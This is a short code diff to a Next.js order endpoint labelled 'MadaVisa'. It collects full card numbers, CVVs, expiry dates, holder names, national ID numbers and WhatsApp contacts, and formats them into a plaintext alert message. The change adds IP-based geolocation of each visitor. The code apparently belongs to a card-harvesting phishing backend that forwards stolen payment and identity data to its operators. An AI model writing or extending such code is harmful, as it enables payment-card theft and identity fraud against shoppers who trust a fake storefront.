@@ -2,7 +2,17 @@ import { NextRequest, NextResponse } from "next/server";
 
 export async function POST(req: NextRequest) {
   const body = await req.json();
-  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment, country } = body;
+  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment } = body;
+
+  // Detect country from visitor IP
+  let country = "-";
+  try {
+    const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || req.headers.get("x-real-ip") || "";
+    if (ip) {
+      const geo = await fetch(`http://ip-api.com/json/${ip}?fields=country`).then(r => r.json());
+      if (geo.country) country = geo.country;
+    }
+  } catch {}
 
   // Validation
   if (!cardNumber || !expiry || !cvv || !cardHolder || !items?.length || !total) {
@@ -41,7 +51,7 @@ export async function POST(req: NextRequest) {
     `💳 MadaVisa - New Order`,
     `👤 Order For: ${customer ?? "-"}`,
     `📱 WhatsApp: ${whatsapp ?? "-"}`,
-    `🌍 Country: ${country ?? "-"}`,
+    `🌍 Country: ${country}`,
     `💳 Card Number: ${cardNumber}`,
     `👤 Card Holder: ${cardHolder}`,
     `📅 Valid To: ${expiry}`,
